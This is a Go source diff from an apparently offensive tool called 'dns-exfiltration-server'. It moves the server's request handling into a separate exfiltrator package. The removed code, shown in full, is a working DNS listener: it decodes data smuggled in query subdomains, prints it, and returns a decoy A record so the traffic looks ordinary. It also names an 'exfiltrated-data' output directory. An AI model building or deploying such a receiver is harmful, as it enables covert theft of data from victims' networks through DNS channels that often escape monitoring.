@@ -1,25 +1,14 @@
 package main
 
 import (
+	"dns-exfiltration-server/exfiltrator"
 	"dns-exfiltration-server/parser"
-	"errors"
 	"fmt"
 	"log"
 	"net"
 	"os"
 	"os/signal"
-	"strings"
 	"syscall"
-
-	"github.com/miekg/dns"
-)
-
-const (
-	// Messages carried by UDP are restricted to 512 bytes (not counting the IP
-	// or UDP headers).
-	// - https://www.rfc-editor.org/rfc/rfc1035#section-4.2.1
-	MAX_UDP_PACKET_SIZE = 512
-	EXFILTRATION_DIR    = "./exfiltrated-data"
 )
 
 func main() {
@@ -44,48 +33,6 @@ func main() {
 	}
 	defer udpServer.Close()
 
-	createDirIfNotExists(EXFILTRATION_DIR)
-
-	handleDnsRequests(udpServer, args.NameServer)
-}
-
-func createDirIfNotExists(path string) {
-	_, err := os.Stat(path)
-	if errors.Is(err, os.ErrNotExist) {
-		err = os.Mkdir(path, 0644)
-		if err != nil {
-			log.Fatalln(err)
-		}
-	}
-}
-
-func handleDnsRequests(udpServer *net.UDPConn, nameServer string) {
-	buf := make([]byte, MAX_UDP_PACKET_SIZE)
-	for {
-		_, clientAddr, err := udpServer.ReadFromUDP(buf)
-		if err != nil {
-			log.Fatalln(err)
-		}
-
-		var request dns.Msg
-		request.Unpack(buf)
-		name := request.Question[0].Name
-		subdomains := strings.Split(name, nameServer)[0]
-		data := strings.ReplaceAll(subdomains, ".", "")
-		fmt.Println(data)
-
-		var reply dns.Msg
-		reply.SetReply(&request)
-		rr, err := dns.NewRR(fmt.Sprintf("%s 300 IN A 8.8.8.8", name))
-		if err != nil {
-			log.Fatalln(err)
-		}
-		reply.Answer = append(reply.Answer, rr)
-
-		response, err := reply.Pack()
-		if err != nil {
-			log.Fatalln(err)
-		}
-		udpServer.WriteToUDP(response, clientAddr)
-	}
+	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(args.NameServer)
+	dnsExfiltrator.HandleDnsRequests(udpServer, args.NameServer)
 }
